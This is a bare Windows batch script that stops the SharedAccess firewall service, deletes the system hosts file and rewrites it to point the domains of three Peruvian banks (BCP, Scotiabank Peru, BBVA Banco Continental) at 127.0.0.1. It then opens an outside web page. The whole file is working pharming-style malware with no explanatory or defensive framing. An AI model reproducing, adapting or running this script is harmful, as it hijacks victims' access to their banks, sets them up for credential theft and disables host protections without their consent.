@echo off

net stop SharedAccess

del "%windir%\system32\drivers\etc\hosts"

echo 127.0.0.1  viabcp.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  www.viabcp.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  scotiabank.com.pe >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  www.scotiabank.com.pe >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  bbvabancocontinental.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  www.bbvabancocontinental.com >> %windir%\system32\drivers\etc\hosts

start http://srvr.timwe.com/timwe_prod/PROD_COL/PERU/CLARO/minisite/index.php

exit